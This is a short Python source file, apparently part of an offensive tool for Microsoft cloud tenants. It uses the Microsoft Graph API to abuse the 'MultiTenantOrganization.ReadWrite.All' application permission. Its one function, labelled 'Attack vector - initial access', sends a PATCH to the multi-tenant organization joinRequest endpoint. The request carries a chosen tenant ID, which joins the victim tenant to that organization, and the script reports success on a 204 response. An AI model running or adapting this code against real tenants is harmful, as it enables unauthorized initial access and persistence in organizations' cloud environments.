import requests
import colorama
from colorama import Fore, Style


def MultiTenant_Vectors(request_headers, MultiTenantSettings):
    print()
    print(
        "MultiTenantOrganization.ReadWrite.All - Allows the app to read and write all multi-tenant organization details and tenants, without a signed-in user.")
    print()
    try:
        print("Attack vector - initial access")

        create_message_URL = "https://graph.microsoft.com/beta/tenantRelationships/multiTenantOrganization/joinRequest"
        message_obj = {
            "addedByTenantId": MultiTenantSettings["tenantId"]
        }

        result = requests.patch(create_message_URL, json=message_obj, headers=request_headers)
        print(result.status_code)
        print(result.text)
        if result.status_code == 204:
            print(Fore.GREEN + "Setup multi tenant with " + MultiTenantSettings["tenantId"])
            print(Style.RESET_ALL)

    except:
        pass
